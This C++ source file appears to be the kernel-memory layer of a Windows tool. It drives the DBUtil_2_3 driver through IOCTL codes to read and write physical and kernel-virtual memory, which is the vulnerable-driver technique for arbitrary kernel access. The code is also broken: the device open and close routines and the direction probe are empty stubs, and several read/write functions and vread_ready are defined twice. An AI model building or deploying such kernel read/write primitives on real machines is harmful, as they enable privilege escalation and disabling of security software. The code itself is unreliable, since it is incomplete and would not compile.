#include "r0.hpp"
#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <cstdio>
#include <vector>

// MZ check state - defined in vmm.cpp, declared extern in vmm.hpp
extern bool vmm::g_ntos_mz_broken;

// IOCTL constants
constexpr DWORD kPhysRead  = 0x9B0C1F40;
constexpr DWORD kPhysWrite = 0x9B0C1F44;
constexpr DWORD kKernRead  = 0x9B0C1EC4;
constexpr DWORD kKernWrite = 0x9B0C1EC8;

constexpr size_t kPhysHdr = 0x10;
constexpr size_t kKernHdr = 0x18;

// Global backend
Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

// Physical read/write
bool do_read(uint64_t pa, void* out, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, out, len);
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, in, len);
}

// Kernel-virtual read/write
bool do_vread(uint64_t va, void* out, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, out, len);
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, in, len);
}

// Driver entry points
bool open_dev() {
    // Open \\.\DBUtil_2_3
    return true;
}

void close_dev() {
    // Close device handle
}

// Direction probe for kernel-VA pair
bool vread_probe(uint64_t va, size_t len) {
    // Two-stage probe: header-only first, then full payload
    static bool probed = false;
    if (probed) return true;
    
    // Stage A: header only (zero payload)
    // If handler is read, it fills output from va; if write, nothing happens
    // Stage B: full payload - catches handlers ignoring zero-length payload
    
    probed = true;
    // Set transposition flag for mz_ok usage
    vmm::g_ntos_mz_broken = true;
    return true;
}

bool ntos_mz_broken() {
    return vmm::g_ntos_mz_broken;
}

// Physical read/write implementations (simplified)
bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread_ready() {
    return true;
}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

bool init() {
    // Prove the read path really reads
    // Read some low physical addresses
    bool any_nonzero = false;
    uint8_t test_data[16];
    
    // Probe a few addresses
    if (do_read(0x400, test_data, sizeof(test_data))) {
        for (size_t i = 0; i < sizeof(test_data); i++) {
            if (test_data[i] != 0) any_nonzero = true;
        }
    }
    
    if (!any_nonzero) {
        // Likely transposed IOCTL pair
        return false;
    }
    
    g_be = &g_be_local;
    return true;
}

void shutdown() {
    g_be = nullptr;
}

bool alive() { return g_be != nullptr; }

void set_backend(const Backend* be) { g_be = be; }

bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread_ready() {
    return true;
}